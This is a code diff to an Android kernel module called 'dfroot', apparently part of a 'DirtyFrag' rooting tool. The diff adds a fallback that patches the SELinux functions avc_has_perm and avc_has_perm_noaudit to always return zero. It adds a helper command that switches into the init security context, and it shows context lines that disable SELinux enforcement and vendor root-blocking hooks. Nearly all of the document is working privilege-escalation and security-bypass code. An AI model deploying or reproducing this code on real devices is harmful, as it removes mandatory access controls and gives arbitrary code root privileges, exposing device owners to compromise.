@@ -219,6 +219,7 @@ static int __nocfi __init dfroot_init(void)
     bool *selinux_state;
     module_kallsyms_lookup_name_t mkln;
     struct kprobe kln_kp;
+    void *avc_fn, *avc_noaudit_fn;
     void *oplus_exe_fn, *oplus_root_fn, *defex_enforce_fn, *defex_umh_fn;
     void *info;
     int ret;
@@ -247,6 +248,7 @@ static int __nocfi __init dfroot_init(void)
         " cp /data/user_de/0/df.root/files/lsmod1.txt /data/media/0/Download/DirtyFrag/ 2>/dev/null;"
         " /data/user_de/0/df.root/kmsglog &"
         "%s"
+        " echo -n 'u:r:init:s0' > /proc/self/attr/exec;"
         " exec %s",
         vr_marker, bootstrap);
 
@@ -292,6 +294,27 @@ static int __nocfi __init dfroot_init(void)
     }
     WRITE_ONCE(*selinux_state, false);
     pr_info("dfroot: selinux_state permissive\n");
+
+    /* Some kernels build with CONFIG_SECURITY_SELINUX_DEVELOP=n, where the
+     * selinux_state write cannot switch enforcing off. Fall back to the AVC
+     * checks only when the state is still enforcing. */
+    if (READ_ONCE(*selinux_state)) {
+        avc_fn = (void *)get_addr("avc_has_perm");
+        if (!avc_fn)
+            pr_err("dfroot: avc_has_perm not found, skipping\n");
+        else {
+            patch_fn_ret_zero(avc_fn);
+            pr_info("dfroot: avc_has_perm patched\n");
+        }
+
+        avc_noaudit_fn = (void *)get_addr("avc_has_perm_noaudit");
+        if (!avc_noaudit_fn)
+            pr_err("dfroot: avc_has_perm_noaudit not found, skipping\n");
+        else {
+            patch_fn_ret_zero(avc_noaudit_fn);
+            pr_info("dfroot: avc_has_perm_noaudit patched\n");
+        }
+    }
 
     // Oppo/OnePlus
     oplus_exe_fn = (void *)(mkln ? mkln("oplus_exe_block_ret_handler") : 0);
@@ -438,9 +461,13 @@ vr_done:;
 
     ret = umh_exec(info, UMH_WAIT_EXEC);
     pr_info("dfroot: usermodehelper_exec returned %d\n", ret);
-    
+
+    /* Some kernels' CFI init walks both __cfi_jt_init_module and
+     * __cfi_jt_cleanup_module; a missing cleanup entry can crash strcmp. */
     return -ENODEV; /* return any error to unload module */
 }
 
-/* no module_exit: we never unload; saves .exit sections */
+static void __exit dfroot_exit(void) {}
+
 module_init(dfroot_init);
+module_exit(dfroot_exit);
